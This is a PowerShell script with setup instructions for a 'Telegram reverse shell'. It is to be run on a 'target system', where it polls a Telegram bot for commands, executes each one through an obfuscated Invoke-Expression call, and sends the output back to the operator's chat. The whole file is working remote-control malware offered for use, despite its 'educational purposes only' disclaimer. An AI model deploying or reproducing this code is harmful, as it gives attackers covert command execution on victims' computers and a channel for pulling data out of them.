<#
============================================== Beigeworm's Telegram Reverse Shell ======================================================

SYNOPSIS
This script connects target computer with a telegram chat to send powershell commands.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. add chat ID for the chat bot (use this below to find the chat id) 

---------------------------------------------------
$Token = "Token_Here" # Your Telegram Bot Token 
$url = 'https://api.telegram.org/bot{0}' -f $Token
$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-----------------------------------------------------

5. Run Script on target System
6. Check telegram chat for 'waiting to connect' message.
7. this script has a feature to wait until you start the session from telegram.
8. type in the computer name from that message into telegram bot chat to connect to that computer.

THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
#>
#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
$Token = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
$ChatID = "YOUR_BOT_CHAT_ID_HERE"
$PassPhrase = "$env:COMPUTERNAME"
$URL='https://api.telegram.org/bot{0}' -f $Token 
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

#----------------------------------------------- ON CONNECT ------------------------------------------------------
sleep 1

$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect.."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"


#----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------
Function Close{
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Connection Closed."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
exit
}
Sleep 5
# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
    $script:AcceptedSession="Authenticated"
    $MessageToSend = New-Object psobject 
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started."
    Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
    return $messages.message.chat.id
    }
    Else{
    return 0
}}

Function StrmFX{
param(
$Stream
)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force
$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0}
foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
}
return $FixedResult
}

Function stgmsg{
param(
$Messagetext,
$ChatID
)
$FixedText=StrmFX -Stream $Messagetext
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line
$JsonData=($MessageToSend | ConvertTo-Json)
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
}

Function rtgmsg{
try{
        $inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
        return $inMessage.result[-1]
}
Catch{
    return "TGFail"
}}

Sleep 5

While ($true){sleep 2
$messages=rtgmsg
if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
Else{
if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
    try{
         $Result=ie`x($messages.message.text) -ErrorAction Stop
         $Result
         stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
         }
   catch {stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}
   Finally{$lastexecMessageID=$messages.message.date
}}}}
